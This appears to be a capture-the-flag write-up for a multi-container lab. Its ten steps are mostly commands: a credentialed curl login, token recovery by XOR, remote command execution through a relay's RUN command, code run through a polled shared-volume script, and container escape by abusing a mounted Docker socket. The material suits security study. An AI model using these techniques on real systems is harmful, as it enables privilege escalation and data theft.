# Writeup — Ferryman's Relay (SPOILERS)

Flag values below are placeholders since real values are per-deployment
secrets. Replace with what your own instance gives you.

1. View-source `/` → HTML comment.
2. `curl -d "username=relay_ops&password=ferryman2024" http://TARGET:8006/login`
   → flag 2, plus a download link for `relay-client`.
3. `strings relay-client` shows `FERRY1` (the protocol magic) and
   `VERSION`/`STATUS`/`RUN` (command names), plus a usage string
   confirming `<host> <port> <COMMAND> [args]`. From a shell with
   network access to `relay` (e.g. inside the web container, or via
   `nc`): `./relay-client relay 9099 VERSION` → flag 3.
4. `strings` also shows a plausible-looking `FR-0001-LEGACY` string —
   that one is a honeypot, explicitly unused (see
   `relay_client.c`'s own comment once you have the source, or just
   notice the server rejects it). The REAL token is XOR'd, not plain
   text. `objdump -d relay-client` on `decode_token` shows
   `xor $0x5a,%eax` against bytes from a `TOKEN_XORED` array — XOR each
   byte with `0x5A` by hand (or a one-line script) to recover
   `FR-9f2c-RELAY`. Then: `./relay-client relay 9099 STATUS` → flag 4.
5. `./relay-client relay 9099 RUN "cat /opt/relay/secret/flag5.txt"`
   → flag 5. Also read `/opt/relay/secret/relay.conf` — it has an
   `emergency_recovery_passphrase`, needed for flag 10.
6. / 7. Relay and Vault share a volume at `/shared`, polled by a script
   on Vault that executes anything dropped at `/shared/task.sh` with
   Vault's own privileges — no shell to Vault exists otherwise. Through
   Relay's RUN RCE:
   ```
   ./relay-client relay 9099 RUN "echo 'cat /opt/vault/secret/flag6.txt /opt/vault/secret/flag7.txt' > /shared/task.sh"
   ```
   Wait a couple seconds, then:
   `./relay-client relay 9099 RUN "cat /shared/task_output.txt"` → flags 6 and 7.
8. Through that same task-queue mechanism, check what's mounted on
   Vault: `ls -la /var/run/docker.sock` exists. Use it (through the same
   `/shared/task.sh` mechanism, setting `DOCKER_API_VERSION=1.44` if
   your Docker CLI complains about an old client version):
   ```
   docker exec halcyon-legendary-web cat /opt/web/secret/flag8.txt
   ```
   → flag 8 — a file that was never reachable via any HTTP route on Web
   at all.
9. Same socket, a fresh container this time:
   ```
   docker run --rm -v halcyon-legendary-host-secrets:/data alpine cat /data/flag9.txt
   ```
   → flag 9. (First run pulls `alpine` — expect a short pause.)
10. Same volume also has `dossier.enc`:
    ```
    docker run --rm -v halcyon-legendary-host-secrets:/data alpine cat /data/dossier.enc > dossier.enc
    python3 docker/flagcrypto.py decrypt "<passphrase from step 5>" dossier.enc -
    ```
    → flag 10.

## Honeypots encountered (intentional, cost time only)
- Web `/admin` — a plausible path, 501, nothing behind it.
- `relay-client`'s plaintext `FR-0001-LEGACY` string — looks like the
  auth token, isn't; the server rejects it outright.
